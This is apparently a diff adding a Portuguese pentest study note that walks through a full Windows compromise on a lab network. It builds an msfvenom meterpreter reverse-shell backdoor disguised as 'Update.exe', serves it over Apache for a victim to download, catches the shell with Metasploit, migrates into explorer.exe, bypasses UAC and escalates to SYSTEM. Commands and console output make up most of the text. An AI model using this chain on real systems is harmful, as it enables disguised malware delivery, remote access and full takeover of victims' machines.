@@ -1,0 +1,234 @@
+---
+tags:
+  - Pentest
+  - WEB
+---
+# Criando o backdoor
+
+Primeiro, criaremos um payload com a função **reverse_tcp**. Portanto, abra seu terminal e execute o seguinte comando:
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.4 lport=1234 -o Update.exe
+```
+
+*IP = sua máquina*
+*A porta pode ser qualquer uma. Deve ser usada a mesma posteriormente*
+
+Agora você encontrará o arquivo `.exe` criado no diretório do Linux
+
+# Colocando o backdoor na máquina alvo
+Vamos hospedar o backdoor em um servidor simples. Primeiro startando servidor:
+```powershell
+service apache2 start
+```
+
+Copia-lo para uma pasta do servidor
+```shell
+cp Update.exe /var/www/html #diretório do apache
+```
+
+Agora você precisaria encontrar uma maneira de ==fazer a máquina alvo executá-lo==. Há várias maneiras de fazer isso po meio de Engenharia Social, porém esse método está fora do escopo deste tutorial. Vou apenas exemplificar como o alvo acessaria o link com o backdoor:
+```powershell
+http://192.168.200.56/Update.exe
+```
+
+O download iniciará instantaneamente.
+
+```powershell
+$ msfconsole  
+```
+
+Agora, vamos selecionar o arquivo e usa-lo
+
+```powershell
+msf6 > use multi/handler
+```
+
+Escolher o payload de para windows, setar o LHOST (nossa máquina) e a porta. Agora só escrever **run** e aguardar a máquina alvo se conectar
+
+```shell
+> set payload windows/meterpreter/reverse_tcp
+#payload => windows/meterpreter/reverse_tcp
+> set lhost 192.168.200.46
+#lhost => 192.168.200.46
+
+> set lport 4444
+#lport => 4444
+
+> run
+
+#[*] Started reverse TCP handler on 192.168.200.46:4444 
+```
+
+Assim que a máquina executar o arquivo, teremos conseguido acesso total.
+
+# Escalação de Privilégios
+Com `getuid` conseguimos ver que temos por enquanto apenas permissão de usuário comum
+```powershell
+meterpreter > getuid
+#Server username: rae-PC\rae
+```
+
+Para conseguir um nível de administração do sistema, daremos o comando `getsystem`. Assim, teremos mais acesso que antes, porém ainda não é um acesso completo. 
+
+Caso o usuário feche a sessão, perderemos nosso acesso, portanto vamos seguir os próximos passos
+
+Por meio do `getpig`, podemos ver nosso processo atual. Portanto, vamos trocar nosso *pig* por um de outro **processo que sempre está rodando**. Vamos rodar o comando `ps` para ver todos os processos e pegar o pig do processo `explorer.exe`
+
+```powershell
+meterpreter > getpid
+#Current pid: 1840
+
+meterpreter > ps
+2648  2616  explorer.exe    x64   1  
+rae-PC\rae              C:\Windows\explorer.exe
+```
+
+Para trocar, daremos o seguinte comando:
+```powershell
+meterpreter > migrate 2648
+[*] Migrating from 1840 to 2648...
+[*] Migration completed successfully.
+
+meterpreter > getpid
+Current pid: 2648 # migração concluida
+```
+
+Agora, continuando com a escalação de privilégios, vamos entrar no shell e verificar nosso usuário, que ainda é um usuário padrão:
+
+```powershell
+meterpreter > shell
+Process 820 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+rae-pc\rae #usuário comum
+```
+
+Para isso, vamos sair com `exit` e jogar a sessão para background, criar uma nova e implementar outro exploit para escalação
+
+```powershell
+C:\Windows\system32>exit
+exit
+
+meterpreter > background
+#[*] Backgrounding session 1...
+
+msf6 exploit(multi/handler) > sessions
+
+#Active sessions 3===============
+
+#  Id  Name  Type                     Information          Connection
+#  --  ----  ----                     -----------          ----------
+  #1         meterpreter x64/windows  rae-PC\rae @ RAE-PC  192.168.200.46:4444 -> 192.168.20
+                                                          #0.53:49447 (192.168.200.53)
+
+```
+
+
+```powershell
+msf6 exploit(multi/handler) > search uac
+```
+
+O exploit que usuaremos agora é este:
+
+![[Pasted image 20231126172758.png]]
+
+```powershell
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac
+#[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac) > 
+```
+
+Por meio do comando `show options` conseguimos perceber que precisamos setar uma *session* que no caso é a sessão que anteriormente deixamos em background.
+
+```powershell
+msf6 exploit(windows/local/bypassuac) > show options
+
+Module options (exploit/windows/local/bypassuac):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: P
+                                         SH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process,
+                                         none)
+   LHOST     192.168.200.46   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+View the full module info with the info, or info -d command.
+```
+
+Vamos setar o mesmo payload anterior
+
+```powershell
+msf6 exploit(windows/local/bypassuac) > set payload windows/meterpreter/reverse_tcp
+```
+
+Agora escolher uma arquitetura especifica, selecionar os mesmos `lhost` e `lport` como anteriormente e por  fim selecionar a sessão que deixamos em background
+
+```powershell
+msf6 exploit(windows/local/bypassuac) > show targets
+
+#Exploit targets:
+#=================
+
+#    Id  Name
+#    --  ----
+#>  0   Windows x86
+#    1   Windows x64
+
+msf6 exploit(windows/local/bypassuac) > set target 0
+#target => 0
+
+msf6 exploit(windows/local/bypassuac) > set lhost 192.168.200.46
+#lhost => 192.168.200.46
+
+msf6 exploit(windows/local/bypassuac) > set lport 2022
+#lport => 2022
+
+msf6 exploit(windows/local/bypassuac) > set session 1
+#session => 1
+
+msf6 exploit(windows/local/bypassuac) > exploit
+```
+
+Uma nova sessão será criada e ficará na session 3. Com `getuid` vemos que ainda somos usuário comum, porém escalar o privilégio com o comando `getsystem`:
+
+```powershell
+meterpreter > getsystem
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+Agora basta abrir o shell e ver nosso privilégio de admin. 
+
+```powershell
+meterpreter > shell
+#Process 448 created.
+#Channel 1 created.
+#Microsoft Windows [Version 6.1.7601]
+#Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+#whoami
+#nt authority\system
+```
+
